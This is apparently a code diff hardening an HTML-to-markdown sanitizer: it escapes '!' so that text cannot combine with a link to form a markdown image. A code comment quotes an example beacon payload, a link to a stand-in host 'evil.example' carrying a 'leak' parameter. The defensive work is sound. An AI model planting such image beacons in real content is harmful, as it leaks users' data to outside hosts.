@@ -71,9 +71,21 @@ function decodeHtmlEntities(value: string): string {
   })
 }
 
-/** Characters that would otherwise be read as markdown syntax in plain text. */
+/**
+ * Characters that would otherwise be read as markdown syntax in plain text.
+ *
+ * `!` is in the list because of security-review round 3: without it, a
+ * description ending in an exclamation mark directly before a link —
+ *
+ *   Great job!<a href="https://evil.example/px.png?leak=1">x</a>
+ *
+ * — emitted `Great job!` immediately followed by `[x](<…>)`, which markdown
+ * reads as an IMAGE (`![alt](url)`), not text plus a link. That reassembles the
+ * beacon this module exists to prevent and would rely entirely on the render
+ * layer refusing images. Two layers only count if each holds alone.
+ */
 function escapeMarkdown(text: string): string {
-  return text.replace(/([\\`*_[\]<>])/g, '\\$1')
+  return text.replace(/([\\`*_[\]<>!])/g, '\\$1')
 }
 
 /**
@@ -218,7 +230,7 @@ export function htmlToMarkdown(html: string | null | undefined): string {
   let linkHref: string | null = null
   let linkText = ''
   let listDepth = 0
-  let orderedIndex: number[] = []
+  const orderedIndex: number[] = []
 
   const emit = (text: string) => {
     if (linkHref !== null) linkText += text
@@ -368,7 +380,6 @@ export function htmlToMarkdown(html: string | null | undefined): string {
     .replace(/[ \t]{2,}/g, ' ')
     .trim()
 
-  orderedIndex = []
   return normalized.length > MAX_DESCRIPTION_CHARS
     ? `${normalized.slice(0, MAX_DESCRIPTION_CHARS)}…`
     : normalized
